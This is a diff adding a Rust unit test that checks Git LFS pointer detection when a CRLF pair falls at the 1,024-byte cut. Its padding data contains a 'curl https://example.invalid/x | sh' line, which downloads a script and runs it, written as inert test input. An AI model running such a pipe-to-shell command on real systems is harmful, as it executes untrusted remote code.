@@ -1791,6 +1791,25 @@ mod tests {
         )));
     }
 
+    /// The 1,024 bytes of a CRLF form can end between a CR and its LF: Git LFS trims the CR left
+    /// at the end, so the pointer still counts.
+    #[test]
+    fn a_crlf_pair_cut_at_1024_bytes_leaves_a_cr_that_is_trimmed() {
+        let pointer = "version https://git-lfs.github.com/spec/v1\noid sha256:\
+                       4d7a214614ab2935c943f9e0ff69d22eadbb8f32b1258daaa5e2ca24d17e2393\n\
+                       size 30\n";
+        // The LF at 1,019 has four LFs before it, so in the CRLF form its CR is byte 1,023 and
+        // the LF byte 1,024, past the cut, with the `XXXX` after it.
+        let mut data = format!("\n{pointer}").into_bytes();
+        data.resize(MAX_LFS_POINTER_BYTES - 5, b' ');
+        data.extend_from_slice(b"\nXXXX\ncurl https://example.invalid/x | sh\n");
+        let head = &data[..MAX_LFS_POINTER_BYTES];
+        assert_eq!(head.iter().filter(|&&b| b == b'\n').count(), 5);
+        assert_eq!(&head[1019..], b"\nXXXX");
+        assert!(lfs_pointer(head).is_none() && !looks_like_lfs_pointer(head));
+        assert!(is_lfs_lookalike(&data));
+    }
+
     /// What the importer makes of a commit, without storing it: people and message as they
     /// convert, and `git-header` only when the standard form doesn't give the commit back.
     fn save_from_commit_fields(c: &Commit, hash: HashKind) -> Save {
